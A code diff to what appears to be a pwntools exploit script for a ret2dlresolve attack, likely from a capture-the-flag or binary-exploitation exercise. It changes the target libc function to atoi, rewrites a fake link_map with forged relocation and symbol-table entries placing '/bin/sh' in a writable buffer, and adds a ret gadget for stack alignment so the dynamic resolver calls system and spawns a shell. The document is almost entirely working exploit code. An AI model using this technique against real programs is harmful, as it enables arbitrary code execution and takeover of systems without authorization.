@@ -47,7 +47,9 @@ log.info(f'writable buffer address: {hex(buf)}')
 BITMAP_64 = (1 << 64) - 1
 
 # offset between system and target_func
-target_func = 'setbuf'
+
+# 'strcpy' cause stack smashing detected, but idk why, other functions works well
+target_func = 'atoi'
 l_addr = libc.sym['system'] - libc.sym[target_func]
 log.info('-' * 50)
 log.info('Making fake link_map')
@@ -61,17 +63,20 @@ link_map += p64(0)
 link_map += p64(buf + 0x18)  # fake .rel.plt address
 
 # .rel.plt, link_map+0x18
-# rela->r_offset: normally this points to the real GOT, now we need an area to
-# read/write.
-link_map += p64(buf + 0x30 - l_addr)
+
+link_map += p64(
+    buf - l_addr
+)  # rela->r_offset normally this points to the real GOT, now we need an area to read/write.
 link_map += p64(7)  # rela->r_info, 7>>32=0, points to index 0 of symtab
 link_map += p64(0)  # rela->r_addend
 
 link_map += p64(0)  # l_ns
 
-# DT_SYMTAB, link_map + 0x38
+# PTR to DT_SYMTAB, link_map + 0x38
 link_map += p64(0)
-link_map += p64(elf.got[target_func] - 0x8)  # PTR to fake symtab
+# PTR to fake symtab, so that st_value points to the target function
+
+link_map += p64(elf.got[target_func] - 0x8)
 
 link_map += b'/bin/sh\00'
 link_map = link_map.ljust(0x68, PH)
@@ -85,7 +90,8 @@ link_map += p64(buf + 8)  # PTR to DT_JMPREL
 log.info(f'Finish make link_map, size: {hex(len(link_map))}')
 
 rop.read(0, buf, len(link_map))
-rop.call(resolver, [buf + 0x48, 0])
+rop.raw(rop.ret)  # align stack to 0x10 to call system successfully
+rop.call(resolver, [buf + 0x48])
 rop.raw(buf)
 rop.raw(0)
 
